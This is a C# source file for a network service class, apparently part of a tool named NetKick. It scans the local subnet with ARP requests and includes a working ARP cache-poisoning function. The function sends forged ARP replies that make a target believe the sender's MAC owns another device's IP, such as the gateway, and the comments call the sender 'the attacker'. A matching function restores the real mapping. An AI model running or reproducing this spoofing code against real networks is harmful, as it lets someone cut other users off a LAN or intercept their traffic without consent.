using System.Net;
using System.Net.NetworkInformation;
using System.Collections.Concurrent;
using NetKick.Models;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;

namespace NetKick.Services;

/// <summary>
/// Handles ARP packet operations including scanning and spoofing
/// </summary>
public class ArpService : IDisposable
{
    private readonly LibPcapLiveDevice _device;
    private readonly NetworkInterfaceInfo _interfaceInfo;
    private readonly ConcurrentDictionary<IPAddress, NetworkDevice> _devices = new();
    private CancellationTokenSource? _scanCts;
    private bool _disposed;

    // Added fields for scan serialization and tuning
    private readonly object _scanLock = new();
    private volatile bool _isScanning = false;
    private int _responseWaitMs = 5000; // ms to wait for ARP replies after sending

    public IReadOnlyDictionary<IPAddress, NetworkDevice> DiscoveredDevices => _devices;

    public event EventHandler<NetworkDevice>? DeviceDiscovered;
    public event EventHandler<string>? LogMessage;

    public ArpService(LibPcapLiveDevice device, NetworkInterfaceInfo interfaceInfo)
    {
        _device = device;
        _interfaceInfo = interfaceInfo;
    }

    /// <summary>
    /// Opens the device for packet capture
    /// </summary>
    public void Open()
    {
        if (!_device.Opened)
        {
            _device.Open(DeviceModes.Promiscuous, 1000);
            _device.Filter = "arp";
        }
    }

    /// <summary>
    /// Scans the network for devices using ARP requests
    /// </summary>
    public async Task ScanNetworkAsync(IProgress<int>? progress = null, CancellationToken cancellationToken = default)
    {
        // Prevent concurrent scans
        lock (_scanLock)
        {
            if (_isScanning)
            {
                Log("A scan is already in progress.");
                return;
            }
            _isScanning = true;
        }

        _scanCts = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
        var token = _scanCts.Token;

        try
        {
            Open();

            _devices.Clear();

            // Start listening for ARP replies using polling listener
            var listenTask = Task.Run(() => ListenForArpReplies(token), token);

            var allHosts = _interfaceInfo.GetAllHostAddresses().ToList();
            var totalHosts = allHosts.Count;
            var processed = 0;

            Log($"Scanning {totalHosts} hosts in {_interfaceInfo.NetworkAddress}/{_interfaceInfo.PrefixLength}");

            // Add gateway placeholder first (will be updated if discovered)
            var gateway = new NetworkDevice
            {
                IpAddress = _interfaceInfo.GatewayAddress,
                MacAddress = PhysicalAddress.None,
                IsGateway = true
            };

            // Send ARP requests to all hosts with light pacing to avoid drops
            foreach (var ip in allHosts)
            {
                if (token.IsCancellationRequested) break;

                try
                {
                    SendArpRequest(ip);
                }
                catch (Exception ex)
                {
                    Log($"Error sending ARP request to {ip}: {ex.Message}");
                }

                processed++;
                progress?.Report((int)((double)processed / totalHosts * 100));

                // Small delay to avoid flooding the NIC (short and consistent)
                if (processed % 1 == 0)
                    await Task.Delay(3, token);

                if (processed % 200 == 0)
                    await Task.Delay(10, token);
            }

            // Wait a configurable window for replies to arrive
            await Task.Delay(_responseWaitMs, token);

            // Signal listener to stop and wait for it
            _scanCts.Cancel();
            try { await listenTask; } catch (OperationCanceledException) { }

            Log($"Scan complete. Found {_devices.Count} devices.");
        }
        catch (OperationCanceledException)
        {
            Log("Scan cancelled.");
        }
        finally
        {
            _scanCts?.Cancel();
            _scanCts?.Dispose();
            _scanCts = null;

            _isScanning = false;
        }
    }

    /// <summary>
    /// Listens for ARP replies and updates the device list
    /// </summary>
    private void ListenForArpReplies(CancellationToken token)
    {
        while (!token.IsCancellationRequested)
        {
            try
            {
                var result = _device.GetNextPacket(out var packetCapture);

                if (result != GetPacketStatus.PacketRead)
                {
                    // small sleep to avoid tight loop if no packets
                    Thread.Sleep(5);
                    continue;
                }

                var rawPacket = packetCapture.GetPacket();
                var packet = Packet.ParsePacket(rawPacket.LinkLayerType, rawPacket.Data);
                var arpPacket = packet.Extract<ArpPacket>();

                if (arpPacket == null) continue;

                // Process ARP replies
                if (arpPacket.Operation == ArpOperation.Response)
                {
                    var senderIp = arpPacket.SenderProtocolAddress;
                    var senderMac = arpPacket.SenderHardwareAddress;

                    if (senderMac.Equals(PhysicalAddress.None)) continue;

                    var device = new NetworkDevice
                    {
                        IpAddress = senderIp,
                        MacAddress = senderMac,
                        IsGateway = senderIp.Equals(_interfaceInfo.GatewayAddress)
                    };

                    // Try to resolve hostname asynchronously
                    Task.Run(() => ResolveHostname(device));

                    if (_devices.TryAdd(senderIp, device))
                    {
                        DeviceDiscovered?.Invoke(this, device);
                        Log($"Discovered: {senderIp} -> {device.MacAddressString}");
                    }
                    else
                    {
                        var existing = _devices[senderIp];
                        existing.LastSeen = DateTime.Now;

                        // If MAC not set or placeholder, replace with a merged instance (init-only properties)
                        if (existing.MacAddress == null || existing.MacAddress.Equals(PhysicalAddress.None))
                        {
                            var merged = new NetworkDevice
                            {
                                IpAddress = existing.IpAddress,
                                MacAddress = senderMac,
                                Hostname = existing.Hostname,
                                Vendor = existing.Vendor,
                                IsGateway = existing.IsGateway,
                                IsBlocked = existing.IsBlocked,
                                DiscoveredAt = existing.DiscoveredAt,
                                LastSeen = DateTime.Now
                            };

                            _devices[senderIp] = merged;
                            DeviceDiscovered?.Invoke(this, merged);
                            Log($"Updated: {senderIp} -> {merged.MacAddressString}");
                        }
                    }
                }
            }
            catch (Exception) when (token.IsCancellationRequested)
            {
                break;
            }
            catch (Exception ex)
            {
                Log($"Error processing packet: {ex.Message}");
            }
        }
    }

    /// <summary>
    /// Sends an ARP request to discover a device
    /// </summary>
    public void SendArpRequest(IPAddress targetIp)
    {
        try
        {
            var ethernetPacket = new EthernetPacket(
                _interfaceInfo.MacAddress,
                PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"),
                EthernetType.Arp);

            var arpPacket = new ArpPacket(
                ArpOperation.Request,
                PhysicalAddress.Parse("00-00-00-00-00-00"),
                targetIp,
                _interfaceInfo.MacAddress,
                _interfaceInfo.IpAddress);

            ethernetPacket.PayloadPacket = arpPacket;

            _device.SendPacket(ethernetPacket);
        }
        catch (Exception ex)
        {
            Log($"Error sending ARP request to {targetIp}: {ex.Message}");
        }
    }

    /// <summary>
    /// Sends a spoofed ARP reply to poison the target's ARP cache
    /// </summary>
    public void SendArpSpoof(NetworkDevice target, NetworkDevice impersonate)
    {
        try
        {
            // Tell target that we (our MAC) are at impersonate's IP
            var ethernetPacket = new EthernetPacket(
                _interfaceInfo.MacAddress,
                target.MacAddress,
                EthernetType.Arp);

            var arpPacket = new ArpPacket(
                ArpOperation.Response,
                target.MacAddress,
                target.IpAddress,
                _interfaceInfo.MacAddress,  // Our MAC (the attacker)
                impersonate.IpAddress);      // Claiming to be this IP

            ethernetPacket.PayloadPacket = arpPacket;
            _device.SendPacket(ethernetPacket);
        }
        catch (Exception ex)
        {
            Log($"Error sending ARP spoof: {ex.Message}");
        }
    }

    /// <summary>
    /// Sends a legitimate ARP reply to restore the target's ARP cache
    /// </summary>
    public void SendArpRestore(NetworkDevice target, NetworkDevice realDevice)
    {
        try
        {
            // We send the packet from our MAC (required), but the ARP payload contains the real device's info
            var ethernetPacket = new EthernetPacket(
                _interfaceInfo.MacAddress,  // Source must be our MAC to send
                target.MacAddress,
                EthernetType.Arp);

            var arpPacket = new ArpPacket(
                ArpOperation.Response,
                target.MacAddress,
                target.IpAddress,
                realDevice.MacAddress,      // Real MAC in ARP payload
                realDevice.IpAddress);       // Real IP in ARP payload

            ethernetPacket.PayloadPacket = arpPacket;
            _device.SendPacket(ethernetPacket);
        }
        catch (Exception ex)
        {
            Log($"Error sending ARP restore: {ex.Message}");
        }
    }

    /// <summary>
    /// Attempts to resolve the hostname for a device
    /// </summary>
    private async Task ResolveHostname(NetworkDevice device)
    {
        try
        {
            var hostEntry = await Dns.GetHostEntryAsync(device.IpAddress);
            device.Hostname = hostEntry.HostName;
        }
        catch
        {
            // Hostname resolution failed, leave as null
        }
    }

    private void Log(string message) => LogMessage?.Invoke(this, message);

    public void Dispose()
    {
        if (_disposed) return;
        _disposed = true;

        _scanCts?.Cancel();
        _scanCts?.Dispose();

        if (_device.Opened)
            _device.Close();
    }
}
